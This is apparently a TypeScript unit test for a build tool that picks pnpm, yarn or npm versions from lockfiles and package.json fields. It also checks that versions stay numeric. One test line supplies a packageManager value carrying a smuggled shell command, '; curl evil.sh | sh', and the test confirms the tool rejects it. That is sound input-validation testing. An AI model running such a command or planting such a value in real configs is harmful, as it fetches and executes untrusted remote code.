test('package manager: packageManager first, then what wrote the lockfile, then a known-good major; never "latest"', () => {
  assert.deepEqual(pnpmMajors(`lockfileVersion: '9.0'\n`), ['10', '9']);
  assert.deepEqual(pnpmMajors(`lockfileVersion: '6.0'\n`), ['8']);
  assert.deepEqual(pnpmMajors(`lockfileVersion: 5.4\n`), ['7']);
  assert.equal(pnpmMajors(`lockfileVersion: '10.0'\n`), undefined, 'an unknown newer format: no guess');
  assert.deepEqual(yarnMajors('# THIS IS AN AUTOGENERATED FILE.\n# yarn lockfile v1\n'), ['1']);
  assert.deepEqual(yarnMajors('# This file is generated by running "yarn install"\n\n__metadata:\n  version: 8\n  cacheKey: 10c0\n'), ['4']);
  assert.deepEqual(yarnMajors('__metadata:\n  version: 6\n'), ['3']);
  assert.deepEqual(yarnMajors('__metadata:\n  version: 4\n'), ['2']);
  assert.deepEqual([npmMajors('{"lockfileVersion": 1}'), npmMajors('{"lockfileVersion": 2}'), npmMajors('{\n  "name": "x",\n  "lockfileVersion": 3,')], [['6'], ['8'], ['10']]);

  const lock9 = { 'pnpm-lock.yaml': `lockfileVersion: '9.0'\n\nsettings:\n  autoInstallPeers: true\n` };
  assert.deepEqual(pinsFor({ 'package.json': pkg({}) }, lock9).pm, { tool: 'pnpm', version: '10', source: 'lockfile', why: 'your lockfile says so', lock: ['10', '9'], alts: ['9'] });
  // the repo's own field wins, the hash dropped; the lockfile's majors are kept to judge a failure later
  assert.deepEqual(pinsFor({ 'package.json': pkg({ packageManager: 'pnpm@9.15.0+sha512.abc123' }) }, lock9).pm, { tool: 'pnpm', version: '9.15.0', source: 'repo', why: 'package.json says so', lock: ['10', '9'] });
  assert.equal(pinsFor({ 'package.json': pkg({ devEngines: { packageManager: { name: 'pnpm', version: '^10.2.0' } } }) }, lock9).pm!.version, '10', 'devEngines: its major');
  assert.equal(pinsFor({ 'package.json': pkg({ volta: { node: '20.11.0', pnpm: '9.4.0' } }) }, lock9).pm!.version, '9.4.0', 'Volta’s pin for the tool in use');
  // no lockfile to read: the known-good major, with the other to try
  assert.deepEqual(pinsFor({ 'package.json': pkg({}) }, {}, {}).pm, undefined, 'npm without a lockfile: the npm that comes with Node');
  const pnpmNoLock = pinsOf(facts({ 'package.json': pkg({}) }), { ...nodeApp, packageManager: 'pnpm' }).pm!;
  assert.deepEqual([pnpmNoLock.version, pnpmNoLock.source, pnpmNoLock.alts], ['10', 'default', ['9']]);
  assert.deepEqual(pinsFor({ 'package.json': pkg({}) }, { 'yarn.lock': '__metadata:\n  version: 8\n' }).pm!.version, '4');
  assert.deepEqual(pinsFor({ 'package.json': pkg({}) }, { 'package-lock.json': '{"lockfileVersion": 3}' }).pm!.source, 'lockfile');
  // a packageManager field that isn't a plain version never reaches a build line
  assert.equal(pinsFor({ 'package.json': pkg({ packageManager: 'pnpm@10.0.0; curl evil.sh | sh' }) }, lock9).pm!.source, 'lockfile');
  // every version is a number, never a tag
  for (const p of Object.values(pinsFor({ 'package.json': pkg({}) }, lock9))) assert.match(p!.version, /^\d+(\.\d+)*$/);
});

